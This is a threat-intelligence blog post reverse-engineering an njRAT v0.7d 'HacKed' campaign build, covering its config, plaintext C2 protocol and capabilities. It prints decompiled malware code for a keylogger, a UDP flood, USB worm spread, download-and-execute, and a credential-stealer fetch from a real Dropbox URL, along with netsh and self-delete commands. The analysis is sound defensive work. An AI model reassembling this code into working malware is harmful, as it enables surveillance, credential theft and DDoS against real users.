---
title: "njRAT v0.7d 'HacKed' Campaign: Config Extraction, C2 Protocol, and Full Capability Mapping"
permalink: /blog/njrat-im523-hacked-campaign/
date: 2026-04-08 00:00:00 +0000
categories: [malware-reversing, threat-intel]
tags: [njrat, bladabindi, dotnet, rat, keylogger, usb-worm, static-analysis, yara]
image: /assets/images/social/njrat-im523-card.png
description: "Static analysis of a novel njRAT v0.7d im523 build with 'HacKed' campaign tag: C2 config extraction, 30+ command dispatch mapping, USB worm propagation, and credential theft — with reproducible Python tooling and YARA rules."
---

I was doing my usual morning triage run when this one caught my eye — a 37-kilobyte PE sitting at the top of the queue with a perfect risk score. Tiny file. Maximum threat rating. No family match in our similarity engine. No public reporting anywhere.

At 37KB for a full-featured RAT, I figured it was either a loader stub or something stripped down to essentials. Turns out it was neither. It's a complete njRAT v0.7d build — keylogger, screen capture, webcam enumeration, remote shell, USB worm propagation, a DDoS module, credential theft, 30+ C2 commands — all packed into something smaller than most icons on your desktop. And the operator didn't even bother to obfuscate it. Every class name, every method, every config string is sitting there in plaintext waiting to be read.

The C2 domain — `phishing.multimilliontoken.org` — had zero hits on VirusTotal, MalwareBazaar, and Hybrid Analysis when I pulled the sample. The compilation timestamp puts this build at April 4th, just four days before I got to it. Fresh infrastructure, fresh build, campaign tag "HacKed." Someone spun this up recently and it was actively beaconing behind Cloudflare when the sandboxes ran it.

This write-up walks through the full reversing: extracting the configuration, tracing the C2 protocol, decompiling every command handler, and mapping the Win32 API calls to their actual behavior. Every code snippet shown here comes directly from ILSpy decompilation and was verified against the binary — no paraphrasing, no guessing.

---

## Quick Reference

For readers who aren't deep into .NET malware:

- **njRAT (Bladabindi)**: one of the most widely deployed RATs globally, first seen in 2013. Open-source VB.NET implant with a builder GUI that lets operators configure C2, persistence, and campaign tags without writing code. It's commodity malware, but it works — and 13 years later, it's still showing up in active campaigns.
- **im523**: the internal version string for this build. njRAT versions follow the pattern `imXXX` where the number tracks the builder revision.
- **|'|'|**: njRAT's C2 message separator. Every command and response over the wire is delimited with this five-character string. It's essentially the family's signature — if you see `|'|'|` in a TCP stream, you're looking at njRAT.

---

## Sample

| Property | Value |
|---|---|
| **SHA-256** | `ff87cd932e25b024cd10042c186f252fdabdac2c4d4cbc67f89e457697ebbc71` |
| **MD5** | `129df3c4dcaae4c1860a334be50f2ed3` |
| **SHA-1** | `4cda77bc5d5c136c4a5a19122fd378b045cc7dee` |
| **SSDEEP** | `768:dv0w5DGIqLRwuv4oDDXSLzbPgJqqiD8ZuSNuCicI:dcw9poXX4zjg8E3Nh` |
| **File Size** | 37,888 bytes (37 KB) |
| **Format** | PE32 .NET assembly (VB.NET, .NET Framework v2.0) |
| **Packer** | None (initial MPRESS detection was a false positive) |
| **Obfuscation** | None — method names, class names, and strings are all plaintext |
| **Compiled** | 2026-04-04 05:14:49 UTC |
| **First Seen** | 2026-04-08 |

**Identification**: njRAT v0.7d (Bladabindi), build `im523`, campaign tag "HacKed". Compiled 4 days before first observation.

**Scope**: This analysis is primarily static — decompilation, string extraction, PE parsing. Dynamic sandbox results from two independent services were used to confirm C2 connectivity and are documented in the appendix. I did not interact with the C2 server directly.

---

## Infection Chain

![njRAT infection chain](/assets/images/posts/njrat/1_infection_chain.png)
*Full boot sequence: entry point → persistence → mutex → firewall bypass → keylogger + anti-analysis threads → C2 connection → command dispatch loop*

---

## Extracted Configuration

The njRAT builder embeds configuration as plaintext UTF-16LE strings in the .text section. No encryption, no encoding (except the Base64 campaign tag):

| Field | Value | Notes |
|---|---|---|
| **C2 Host** | `phishing.multimilliontoken.org` | Novel domain — no public reporting |
| **C2 Port** | `443` | HTTPS port (but traffic is raw TCP, not TLS) |
| **Mutex** | `411e31664bdd9d96369d0a44d5111aef` | MD5 hash, used as client ID |
| **Version** | `im523` | njRAT builder revision |
| **Campaign Tag** | `SGFjS2Vk` → `HacKed` | Base64-encoded operator tag |
| **Separator** | `\|'\|'\|` | C2 protocol message delimiter |
| **Drop Name** | `server.exe` | Filename for persistence copy |
| **Masquerade** | `svchost.exe`, `Exsample.exe` | Process name spoofing |
| **Persistence** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Registry Run key |
| **Anti-analysis thread** | `True` (`task`) | Enable `mgr.protect()` analysis tool monitor |
| **File relocation** | `False` (`Idr`) | Do not copy self to %TEMP% — run from current location |
| **BSoD protection** | `False` (`BD`) | ProcessBreakOnTermination disabled in this build |

The configuration is stored as public static fields at the top of the `OK` class — fully visible in the decompiled source:

```csharp
// Decompiled from OK class — all config fields as static members
public class OK
{
    public static string HH = "phishing.multimilliontoken.org";  // C2 host
    public static string P = "443";                               // C2 port
    public static string RG = "411e31664bdd9d96369d0a44d5111aef"; // Mutex (MD5)
    public static string VR = "im523";                            // Version
    public static string VN = "SGFjS2Vk";                         // Campaign tag (b64)
    public static string Y = "|'|'|";                             // Separator
    public static string DR = "TEMP";                             // Drop directory
    public static string EXE = "server.exe";                      // Drop filename
    public static string sf = @"Software\Microsoft\Windows\CurrentVersion\Run";
    public static string anti = "Exsample.exe";                   // Masquerade name
    public static string usbx = "svchost.exe";                    // USB spread name
    public static string sizk = "20";                             // Max keylog size (KB)
    public static bool BD = false;     // BSoD protection (ProcessBreakOnTermination)
    public static bool task = true;    // Enable anti-analysis mgr.protect() thread
    public static bool HD = false;     // Hidden file
    public static bool usb = false;    // USB spread enabled
    public static bool anti2 = false;  // Anti-analysis enabled
    // ...
}
```

No encryption, no encoding (except the Base64 campaign tag) — the operator's entire configuration is readable in plaintext from the binary.

The config extractor script (`scripts/extract_njrat_config.py`) automates this extraction:

```bash
python extract_njrat_config.py sample.exe
```

---

## C2 Protocol

![C2 protocol sequence](/assets/images/posts/njrat/3_c2_protocol.png)
*DNS resolution → Cloudflare proxy → plaintext TCP on port 443 → beacon → command/response loop*

njRAT uses **unencrypted raw TCP** with a simple text-based protocol:

```
┌──────────────────────────────────────────────────────┐
│                  njRAT Wire Format                     │
├──────────────────────────────────────────────────────┤
│  <size><NUL><command>|'|'|<arg1>|'|'|<arg2>|'|'|...  │
├──────────────────────────────────────────────────────┤
│  Example beacon:                                       │
│  ll|'|'|<hwid>|'|'|<hostname>|'|'|<username>|'|'|    │
│  <os>|'|'|<date>|'|'|<cam_count>|'|'|<active_win>   │
└──────────────────────────────────────────────────────┘
```

The connection logic from the decompiled `OK.connect()` method:

```csharp
// Decompiled from OK.connect() — the C2 connection handler
public static bool connect()
{
    Cn = false;
    Thread.Sleep(2000);  // 2-second delay before connecting
    
    // Create TCP socket with 200KB buffers and 10-second timeouts
    MeM = new MemoryStream();
    C = new TcpClient();
    C.ReceiveBufferSize = 204800;
    C.SendBufferSize = 204800;
    C.Client.SendTimeout = 10000;
    C.Client.ReceiveTimeout = 10000;
    
    // Connect to C2 — MH() resolves the host, P = "443"
    C.Connect(MH(HH), Conversions.ToInteger(P));
    Cn = true;
    
    // Send initial beacon with system info
    Send(inf());
    
    // Send extended config info: campaign tag, host:port, dropper settings
    string text = DEB(VN) + "\r\n";                    // Base64-decoded campaign tag
    text += H + ":" + P + "\r\n";                      // C2 address
    text += DR + "\r\n" + EXE + "\r\n";                // Drop dir + filename
    text += Conversions.ToString(Idr) + "\r\n";        // Feature flags
    // ... additional boolean flags ...
    Send("inf" + Y + ENB(ref text));                   // Base64-encode and send
}
```

The `Send()` → `Sendb()` chain frames messages with a length prefix:

```csharp
// Decompiled from OK.Send() + OK.Sendb() — message framing
public static bool Send(string S)
{
    return Sendb(SB(ref S));              // UTF-8 encode, then send bytes
}

public static bool Sendb(byte[] b)
{
    if (!Cn) return false;
    lock (LO)
    {
        MemoryStream memoryStream = new MemoryStream();
        string S = b.Length + "\0";       // Length as ASCII string + NUL terminator
        byte[] header = SB(ref S);        // UTF-8 encode the header
        memoryStream.Write(header, 0, header.Length);
        memoryStream.Write(b, 0, b.Length);
        // Single send: [length_string + NUL + payload] as one contiguous buffer
        C.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
    }
}
```

- **No encryption** — all C2 traffic is plaintext, trivially detectable with IDS
- **Port 443** — abuses HTTPS port to evade basic port-based filtering, but the protocol is not TLS
- **Client ID** — the MD5 mutex value (`411e31664bdd9d96369d0a44d5111aef`)

## Class and Method Architecture

The binary is unobfuscated VB.NET with 4 classes:

| Class | Purpose | Key Methods |
|---|---|---|
| `w.A` | **Entry point only** — calls `OK.ko()` | `main()` |
| `w.OK` | **Everything else** — C2 connection, command dispatch, persistence, config, all functionality | `ko()` (boot), `connect()`, `Send()`/`Sendb()`, `Ind()` (dispatch), `INS()` (install), `RC()` (receive), `Plugin()`, `pr()`, `inf()`, `UNS()`, `HWD()`, `ACT()` |
| `w.kl` | **Keylogger** — captures keystrokes via polling | `WRK()` (main loop), `VKCodeToUnicode()`, `Fix()`, `AV()` |
| `w.mgr` | **Anti-analysis** — detects and disrupts analysis tools | `protect()` (main loop), `GetChild()`, `EnumChild()` |

---

## Command Dispatch — Decompiled

The `OK.Ind()` method is the central command dispatcher. It splits the incoming C2 message on the `|'|'|` separator and matches the first token against a long if-else chain:

```csharp
// Decompiled from OK.Ind() — the C2 command router
private static void Ind(byte[] b)
{
    string[] array = Strings.Split(BS(ref b), Y, -1, 0);
    string text = array[0];     // command name
    
    if (text == "shutdowncomputer")
        Interaction.Shell("shutdown -s -t 00", 0, false, -1);
    else if (text == "restartcomputer")
        Interaction.Shell("shutdown -r -t 00", 0, false, -1);
    else if (text == "DisableKM")
        apiBlockInput(1);           // Block keyboard+mouse
    else if (text == "EnableKM")
        apiBlockInput(0);           // Unblock
    else if (text == "TurnOffMonitor")
        SendMessage(-1, 274, 61808, 2);    // HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, OFF
    else if (text == "ReverseMouse")
        SwapMouseButton(256);
    else if (text == "DisableCMD")
        Registry.SetValue(@"HKCU\Software\Policies\Microsoft\Windows\System", 
                          "DisableCMD", "1", RegistryValueKind.DWord);
    else if (text == "DisableTaskManager")
        Registry.SetValue(@"HKCU\...\Policies\System", 
                          "DisableTaskMgr", "1", RegistryValueKind.DWord);
    else if (text == "OpenCD")
        mciSendString("set CDAudio door open", ...);
    else if (text == "peech")
        Interaction.CreateObject("SAPI.Spvoice", "").speak(array[1]);
    else if (text == "ErorrMsg")
        MessageBox.Show(array[4], array[3], ...);    // Fake error dialog
    else if (text == "udp")                          // UDP flood (DDoS)
    {
        TIP = array[1]; Tport = array[2]; delay = int.Parse(array[3]);
        udp = true;
        IPEndPoint target = new IPEndPoint(IPAddress.Parse(TIP), int.Parse(Tport));
        Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
        while (udp) { s.SendTo(new byte[4096], target); Thread.Sleep(delay); }
    }
    else if (text == "pas")                          // Credential theft
    {
        string path = Environ("temp") + "/pass.exe";
        new WebClient().DownloadFile(
            "https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0", path);
        Process.Start(path);
        // Read results and exfiltrate
        Send("pas" + Y + ENB(File.ReadAllText(Environ("temp") + "/temp.txt")));
    }
    else if (text == "rn")                           // Upload & Execute
    {
        byte[] payload = (array[2][0] == '\x1f') 
            ? ZIP(compressedBytes)                   // Decompress GZip
            : new WebClient().DownloadData(array[2]);// Download from URL
        string path = Path.GetTempFileName() + "." + array[1];
        File.WriteAllBytes(path, payload);
        Process.Start(path);
    }
    else if (text == "CAP")                          // Screenshot
    {
        Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, ...);
        Graphics.FromImage(bmp).CopyFromScreen(Point.Empty, Point.Empty, size);
        // Compress to JPEG and send
    }
    // ... 30+ additional commands
}
```

Note the **UDP flood (DDoS)** capability at the `udp` command (not `dos` — the `dos` command is a no-op that just sends an ack) — this turns infected machines into DDoS nodes, sending 4KB UDP packets at a configurable rate. Stopped via `udpstp`.

30+ commands extracted from method names and string analysis:

| Command | Method | Description |
|---|---|---|
| **Remote Shell** | `RC()` thread | C2 receive loop — reads commands from TCP stream |
| **File Compare** | `CompDir()` | Compare two files by directory path (used in install logic) |
| **Delete Registry Value** | `DLV()` | Delete a value from `HKCU\Software\<mutex>` |
| **Upload & Execute** | `rn` command in `Ind()` | Download payload (URL or GZip) → write to temp → `Process.Start` |
| **Decompress** | `ZIP()` | GZip decompress byte array (used for plugin/payload decompression) |
| **Screenshot** | `CAP` command in `Ind()` | `CopyFromScreen` → JPEG compress → send to C2 |
| **Webcam Detect** | `Cam()` | Enumerate webcam drivers via `capGetDriverDescriptionA` |
| **Keylogger** | `kl.WRK()` | `GetAsyncKeyState` polling + `VKCodeToUnicode` + window tracking |
| **BSoD Protection** | `pr(int)` | `NtSetInformationProcess(ProcessBreakOnTermination)` — pr(1)=enable, pr(0)=disable |
| **Boot Sequence** | `ko()` | Entry point: mutex → INS() → RC thread → keylogger → mgr → main loop |
| **Anti-Analysis** | `mgr.protect()` | Kill taskmgr / Process Hacker / Process Explorer via UI manipulation |
| **Plugin Loader** | `Plugin()` | `Assembly.Load(byte[])` — reflective .NET assembly loading from C2 |
| **Get Registry Values** | `GTV()` | Read values from `HKCU\Software\<mutex>` subkey |
| **Set Registry Values** | `STV()` | Write values to `HKCU\Software\<mutex>` subkey |
| **Exit/Disconnect** | `ED()` | Calls `pr(0)` to remove BSoD protection |
| **Shutdown** | `shutdowncomputer` | `shutdown -s -t 00` |
| **Restart** | `restartcomputer` | `shutdown -r -t 00` |
| **Logoff** | `logoff` | `shutdown -l -t 00` |
| **Disable Keyboard/Mouse** | `DisableKM` | `apiBlockInput(True)` |
| **Enable Keyboard/Mouse** | `EnableKM` | `apiBlockInput(False)` |
| **Reverse Mouse** | `ReverseMouse` | `SwapMouseButton(256)` — any nonzero value swaps buttons |
| **Normal Mouse** | `NormalMouse` | `SwapMouseButton(0)` — restore default |
| **Disable CMD** | `DisableCMD` | Registry policy modification |
| **Enable CMD** | `EnableCMD` | Remove CMD restriction |
| **Disable Registry Editor** | `DisableRegistry` | Registry policy |
| **Disable Task Manager** | `DisableTaskManager` | `DisableTaskMgr` policy |
| **Disable System Restore** | `DisableSR` | Prevent recovery |
| **Open CD Tray** | `OpenCD` | `mciSendString("set CDAudio door open")` |
| **Close CD Tray** | `CloseCD` | `mciSendString("set CDAudio door closed")` |
| **Monitor Off** | `TurnOffMonitor` | `SendMessage` with SC_MONITORPOWER |
| **Monitor On** | `TurnOnMonitor` | `SendMessage` wake |
| **Hide Cursor** | `CursorHide` | Hide mouse pointer |
| **Show Cursor** | `CursorShow` | Restore mouse pointer |
| **Open Website** | `OpenSite` | Force-open URL in browser |
| **Change IE Home** | `IEhome` | Modify IE Start Page registry key |
| **Text-to-Speech** | `peech` | `SAPI.SpVoice` — speak attacker's text |
| **Beep/Piano** | `BepX` / `piano` | System beep with custom frequency |
| **Play Music** | `sendmusicplay` | Force audio playback |
| **Error Message** | `ErorrMsg` | Display fake error dialog |
| **IE Homepage Hijack** | `AddHome()` | Change IE Start Page via registry (`IEhome` command) |
| **USB Spread** | `INS()` (when `usb=true`) | Copy as `svchost.exe` + `autorun.inf` to ALL logical drives |
| **Self-Delete** | `UNS` | `cmd.exe /k ping 0 & del` self-removal |
| **Update** | `INS` variant | Download replacement, restart |
| **Credential Theft** | `pas` command in `Ind()` | Download `Pass.exe` from Dropbox, read results from `temp.txt` |
| **Critical Process** | `pr(1)` | `NtSetInformationProcess(ProcessBreakOnTermination)` — BSoD on kill |
| **Firewall Bypass** | `inf` | `netsh firewall add allowedprogram` |

---

## Persistence Mechanisms

### Registry Run Key

Standard `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` entry pointing to the binary. The decompiled `ko()` startup method shows the full initialization sequence:

```csharp
// Decompiled from OK.ko() — actual boot sequence (called from A.main())
public static void ko()
{
    // 1. Set install marker in registry (if launched with command line args)
    if (Interaction.Command() != null)
    {
        F.Registry.CurrentUser.SetValue("di", "!");
        Thread.Sleep(5000);
    }
    
    // 2. Mutex check — single instance enforcement
    bool createdNew = false;
    MT = new Mutex(true, RG, out createdNew);
    if (!createdNew) ProjectData.EndApp();    // Exit if already running
    
    // 3. INS() — handles ALL installation logic:
    //    - File relocation to %TEMP% (if Idr=true)
    //    - netsh firewall add allowedprogram (always)
    //    - Registry Run key persistence (if Isu=true)
    //    - Startup folder copy (if IsF=true)
    //    - Kill anti-malware process (if anti2=true)
    //    - Hide file attributes (if HD=true)
    //    - USB worm spread to all drives (if usb=true)
    INS();
    
    // 4. Start C2 receive thread (RC handles reconnection internally)
    Thread thread = new Thread(RC, 1);
    thread.Start();
    
    // 5. Start keylogger on background thread
    kq = new kl();
    new Thread(kq.WRK, 1).Start();
    
    // 6. Start anti-analysis monitor (if task=true)
    if (task)
    {
        mgr mgr2 = new mgr();
        new Thread(mgr2.protect).Start();
    }
    
    // 7. Enable BSoD protection (if BD=true)
    if (BD) { pr(1); }      // ProcessBreakOnTermination — killing RAT causes BSoD
    
    // 8. Main loop — NOT C2 connection, but housekeeping:
    //    active window reporting, working set trimming, persistence re-verification
    while (true)
    {
        Thread.Sleep(1000);  // 1-second cycle
        Application.DoEvents();
        // ... every 8 iterations: send active window title to C2 via "act" command
        // ... if Isu: verify registry Run key is still present, re-add if removed
    }
}
```

The actual boot order is: install marker → mutex → `INS()` (persistence + firewall + USB spread) → C2 receive thread → keylogger → anti-analysis → BSoD protection → housekeeping loop. The C2 reconnection happens inside `RC()`, not the main loop.

### USB Worm Propagation

![USB spread flow](/assets/images/posts/njrat/6_usb_spread.png)
*Copy to all logical drives as svchost.exe → create autorun.inf → new host auto-executes → repeat*

The USB spread code is inside `INS()` (gated by `if (!usb) return`), not a separate method. It iterates **all logical drives** returned by `Directory.GetLogicalDrives()` — not just removable drives:

```csharp
// Decompiled from OK.INS() — USB worm spread section
string[] logicalDrives = Directory.GetLogicalDrives();   // ALL drives, not just USB
foreach (string drive in logicalDrives)
{
    File.Copy(Application.ExecutablePath, drive + usbx);  // usbx = "svchost.exe"
    File.SetAttributes(drive + usbx, FileAttributes.Hidden);
    
    StreamWriter sw = new StreamWriter(drive + "\\" + "autorun.inf");
    sw.WriteLine("[autorun]");
    sw.WriteLine("open=" + drive + usbx);                 // Full path including drive letter
    sw.WriteLine("shellexecute=" + drive, 1);              // Note: buggy format string
    sw.Close();
    File.SetAttributes(drive + "autorun.inf", FileAttributes.Hidden);
}
```

Note: this copies to **all** logical drives (C:\, D:\, E:\, etc.), not just removable media — more aggressive than typical USB worms. Both the executable and autorun.inf are marked `Hidden`.

### Firewall Exception

`netsh firewall add allowedprogram "server.exe" ENABLE` — adds the RAT as a firewall exception to allow inbound/outbound C2 connections.

---

## Deep Dive: Win32 API Usage

### Keylogger — GetAsyncKeyState + MapVirtualKey + ToUnicodeEx

![Keylogger pipeline](/assets/images/posts/njrat/2_keylogger_pipeline.png)
*Virtual key scan → keyboard layout → scan code → Unicode translation → active window tagging → registry persistence*

The `w.kl` class implements a polling-based keylogger using three Win32 APIs in sequence. Here's how the pipeline works:

**Step 1: Detect key presses with `GetAsyncKeyState`**

```c
// Win32 API (user32.dll)
// Returns the state of a virtual key. If the high bit (0x8000) is set,
// the key is currently pressed. If the low bit (0x0001) is set, the key
// was pressed since the last call.
SHORT GetAsyncKeyState(
    int vKey    // Virtual-key code (VK_A = 0x41, VK_RETURN = 0x0D, etc.)
);

// njRAT polls this in a loop for every virtual key (0x01–0xFE):
for (int vk = 1; vk <= 254; vk++) {
    if (GetAsyncKeyState(vk) & 0x8001) {
        // Key is pressed — proceed to translate it
    }
}
```

Here's the actual decompiled keylogger loop from `kl.WRK()`:

```csharp
// Decompiled from kl.WRK() — the keylogger main loop
public void WRK()
{
    Logs = (string)OK.GTV(vn, "");     // Resume from saved log if any
    while (true)
    {
        int num = 1;
        int num2 = 0;
        do
        {
            // Poll every virtual key (0-255)
            if ((GetAsyncKeyState(num2) == -32767) & !OK.F.Keyboard.CtrlKeyDown)
            {
                Keys k = (Keys)num2;
                string text = Fix(k);         // Translate to readable string
                if (text.Length > 0)
                {
                    Logs += AV();             // Prepend active window title
                    Logs += text;             // Append keystroke
                }
                lastKey = k;
            }
            num2++;
        } while (num2 <= 255);

        // Every 1000 iterations, trim log to 20KB max and persist to registry
        if (num == 1000)
        {
            int maxSize = Conversions.ToInteger("20") * 1024;
            if (Logs.Length > maxSize)
                Logs = Logs.Remove(0, Logs.Length - maxSize);
            OK.STV(vn, Logs, RegistryValueKind.String);  // Save to HKCU\Software\<mutex>
        }
        Thread.Sleep(1);    // 1ms sleep between scan cycles
    }
}
```

Note `GetAsyncKeyState` returns `-32767` (`0x8001`) when a key is pressed — the high bit means "currently down" and the low bit means "pressed since last check." The `& !CtrlKeyDown` filter avoids logging Ctrl+C/Ctrl+V hotkeys (which would pollute the log with clipboard operations).

The RAT calls this in a tight loop (`WRK` method) to detect which keys are currently held. This is a usermode technique — no kernel hook required, no `SetWindowsHookEx`, making it stealthier than hook-based keyloggers.

**Step 2: Get keyboard layout with `GetKeyboardLayout`**

```c
// Win32 API (user32.dll)
// Returns the keyboard layout handle for the thread that owns
// the foreground window. This determines which language/layout
// maps virtual keys to characters (US QWERTY vs French AZERTY, etc.)
HKL GetKeyboardLayout(
    DWORD idThread   // 0 = current thread's input locale
);

// njRAT uses GetWindowThreadProcessId(GetForegroundWindow(), ...) to get
// the foreground thread ID, then passes it here to capture keystrokes
// in the correct language layout.
```

**Step 3: Translate virtual key to Unicode with `ToUnicodeEx`**

```c
// Win32 API (user32.dll)
// Translates a virtual-key code into a Unicode character string,
// using the specified keyboard layout. This is how VK_A becomes 'a'
// or 'A' depending on shift state.
int ToUnicodeEx(
    UINT wVirtKey,           // Virtual-key code
    UINT wScanCode,          // Hardware scan code (from MapVirtualKey)
    const BYTE *lpKeyState,  // 256-byte array from GetKeyboardState()
    LPWSTR pwszBuff,         // Output buffer for the Unicode character
    int cchBuff,             // Buffer size
    UINT wFlags,             // 0 = normal
    HKL dwhkl               // Keyboard layout from GetKeyboardLayout
);

// The scan code comes from MapVirtualKey:
UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
```

The RAT logs the translated character along with a timestamp and the foreground window title (captured via `GetForegroundWindow` + `GetWindowText`). Log entries look like: `[kl]2026/04/08 [Chrome - Google] hello world[ENTER]`.

### Critical Process Protection — NtSetInformationProcess (ProcessBreakOnTermination)

**Correction:** Initial sandbox reports labeled this as "anti-debug," but source code review reveals it's actually **critical process protection** — a denial-of-service anti-removal technique.

The `pr()` method calls `NtSetInformationProcess` with class **29 (`ProcessBreakOnTermination`)**, not ThreadHideFromDebugger:

```c
// ntdll.dll (undocumented, but widely known)
// Sets process information. Class 29 = ProcessBreakOnTermination.
// When set to 1, the process becomes "critical" — if ANY code
// terminates it (user, AV, task manager), Windows triggers a
// Blue Screen of Death (BSOD / bugcheck).
NTSTATUS NtSetInformationProcess(
    HANDLE ProcessHandle,              // GetCurrentProcess()
    PROCESSINFOCLASS ProcessInfoClass, // 29 = ProcessBreakOnTermination
    PVOID ProcessInformation,          // pointer to ULONG (1 = critical)
    ULONG ProcessInformationLength     // sizeof(ULONG)
);

// njRAT's pr() method (decompiled):
public static void pr(int i)
{
    // i = 1: make process critical (BSoD on kill)
    // i = 0: remove critical status (safe to kill)
    NtSetInformationProcess(
        Process.GetCurrentProcess().Handle,
        29,        // ProcessBreakOnTermination
        ref i,     // 1 = enable, 0 = disable
        4          // sizeof(int)
    );
}
```

The RAT uses this in two contexts:
- **`pr(1)`** at startup (when `BD = true` in config) — makes the RAT unkillable without BSoD
- **`pr(0)`** before self-delete in `UNS()` — removes critical status so the process can safely exit

This is more destructive than anti-debug — it turns the RAT into a hostage. An analyst who kills the process crashes the entire system. AV products that terminate malware processes would also trigger a BSoD. The only safe removal path is to call `pr(0)` first, which requires either the C2 operator's cooperation or patching the process in memory.

**Note:** The `DEB` method name in the decompiled source is misleading — it actually stands for "DEcode Base64" (`Convert.FromBase64String`), not "DEBug." The actual NtSetInformationProcess call is in the `pr()` method.

### Input Blocking — BlockInput

The `DisableKM` command locks out the user's keyboard and mouse:

```c
// Win32 API (user32.dll)
// Blocks keyboard and mouse input events from reaching applications.
// Only the calling thread can unblock. Requires the calling process
// to have the input desktop (foreground).
BOOL BlockInput(
    BOOL fBlockIt   // TRUE = block all input, FALSE = unblock
);

// njRAT's DisableKM command:
BlockInput(TRUE);   // User can no longer type or move the mouse

// The attacker retains control via the C2 connection — they can still
// send commands, capture screenshots, and operate the machine remotely
// while the physical user is locked out. Only EnableKM (BlockInput(FALSE))
// or a reboot restores local control.
```

This is particularly dangerous during credential theft operations — the attacker locks out the user to prevent interference while exfiltrating data.

### Mouse Manipulation — SwapMouseButton

```c
// Win32 API (user32.dll)
// Swaps the left and right mouse button functionality.
// Used both as a prank/disruption tool and as a disorientation tactic.
BOOL SwapMouseButton(
    BOOL fSwap   // TRUE = swap buttons, FALSE = restore
);

// njRAT's ReverseMouse command:
SwapMouseButton(TRUE);   // Left-click now right-clicks and vice versa
// NormalMouse command:
SwapMouseButton(FALSE);  // Restore normal behavior
```

### Monitor Control — SendMessage with SC_MONITORPOWER

```c
// Win32 API (user32.dll)
// Sends a system command to the desktop window to control the monitor.
// SC_MONITORPOWER with lParam controls power state:
//   -1 = on, 1 = low power (standby), 2 = off
#define HWND_BROADCAST  ((HWND)0xffff)
#define WM_SYSCOMMAND   0x0112
#define SC_MONITORPOWER 0xf170

// njRAT's TurnOffMonitor:
SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
// Turns off all monitors. The machine keeps running (and the RAT
// keeps operating), but the user sees a black screen.

// TurnOnMonitor:
SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
// Wakes the monitors back up.
```

### Analysis Tool Killing — GetForegroundWindow + EnumChildWindows + SendMessage

![Anti-analysis flow](/assets/images/posts/njrat/4_anti_analysis.png)
*200ms polling loop: detect analysis tool → enumerate child windows → find confirmation dialog → disable cancel button → relabel*

The `mgr` class polls the foreground window (not `EnumWindows`) and uses child window enumeration to manipulate analysis tools:

```c
// Win32 API (user32.dll)
// Returns the handle to the foreground window (the window the user is
// currently interacting with). The mgr class polls this every 200ms.
HWND GetForegroundWindow(void);

// For each window, njRAT calls GetWindowText to get the title,
// then checks if it contains:
//   "taskmgr", "processviewer", "processhacker", "process explorer"
//
// If matched, it walks child windows with EnumChildWindows looking
// for buttons with text "End process" or "End task":

BOOL EnumChildWindows(
    HWND hWndParent,          // Parent window (taskmgr etc.)
    WNDENUMPROC lpEnumFunc,   // Callback
    LPARAM lParam
);

// When the "End process" button is found, njRAT programmatically
// clicks it by sending BM_CLICK:
#define BM_CLICK 0x00F5
SendMessage(hButton, BM_CLICK, 0, 0);

// This effectively clicks the "End process" button inside Task Manager
// to terminate whatever process the user is inspecting — not the
// analysis tool itself, but the user's attempted kill target.
// Alternatively, it can close the analysis tool's window entirely.
```

Here's the actual decompiled `mgr.protect()` method showing the full logic:

```csharp
// Decompiled from mgr.protect() — analysis tool killer
public void protect()
{
    while (true)
    {
        Thread.Sleep(200);      // Check every 200ms
        IntPtr foregroundWindow = GetForegroundWindow();
        if (foregroundWindow.ToInt32() == 0) continue;
        
        int pid = 0;
        GetWindowThreadProcessId(foregroundWindow, ref pid);
        Process proc = Process.GetProcessById(pid);
        
        // Check if foreground window is an analysis tool
        if (proc.ProcessName.ToLower() == "taskmgr" ||
            proc.ProcessName.ToLower() == "processviewer" ||
            proc.ProcessName.ToLower() == "processhacker" ||
            text.ToLower() == "process explorer")     // title-based for Sysinternals
        {
            // Enumerate all child windows
            List<IntPtr> buttons = new List<IntPtr>();
            int staticCount = 0;
            foreach (IntPtr child in GetChild(foregroundWindow))
            {
                string className = GetClassName(child);
                if (className == "button")  buttons.Add(child);
                if (className == "static" || className == "directuihwnd") staticCount++;
            }
            
            // If we find exactly 2 buttons and 1-2 static labels,
            // we're looking at the "End process" confirmation dialog
            if (buttons.Count == 2 && (staticCount == 2 || staticCount == 1))
            {
                // Disable the first button (cancel) and relabel it
                EnableWindow(buttons[0], false);
                SendMessage(buttons[0], WM_SETTEXT, 0, "End process");
                // This tricks the user into clicking a disabled/relabeled button
            }
        }
    }
}
```

This is more subtle than simply killing the analysis tool — it manipulates the Task Manager's UI by disabling buttons and changing their labels, confusing the analyst.

### Firewall Manipulation — netsh (confirmed by sandbox)

The sandbox captured `netsh.exe` (PID 5712) being spawned as a child process:

```
netsh firewall add allowedprogram "C:\Users\admin\Desktop\sample.exe" "sample.exe" ENABLE
```

The sandbox also recorded the registry side-effect: netsh wrote to `HKCR\Local Settings\MuiCache` resolving the Windows Defender Firewall display name, confirming the firewall rule was actually created.

### Self-Delete — Race Condition Technique

```batch
cmd.exe /k ping 0 & del "C:\path\to\malware.exe" & exit
```

This exploits a timing race:
1. `ping 0` sends ICMP to `0.0.0.0` — on Windows this translates to pinging localhost, which takes ~4 seconds (4 retries with 1s timeout)
2. During those 4 seconds, the RAT process exits
3. `del` then deletes the now-unlocked .exe
4. `exit` closes the cmd.exe window

The `&` operator chains commands sequentially in cmd.exe. The ping acts as a `sleep` — Windows cmd.exe has no native sleep command, so `ping` is the classic workaround.

---

## Credential Theft

![Credential theft flow](/assets/images/posts/njrat/5_credential_theft.png)
*C2 command → download Pass.exe from Dropbox → execute → read results from temp.txt → Base64-encode → exfiltrate*

The `Plugin` command downloads `Pass.exe` from a hardcoded Dropbox URL:

```
https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0
```

This is a secondary password recovery tool executed post-infection. The Dropbox hosting provides a semi-legitimate download vector that may bypass URL filtering.

---

## IOC Appendix

### Network Indicators

| Type | Value | Context | Source |
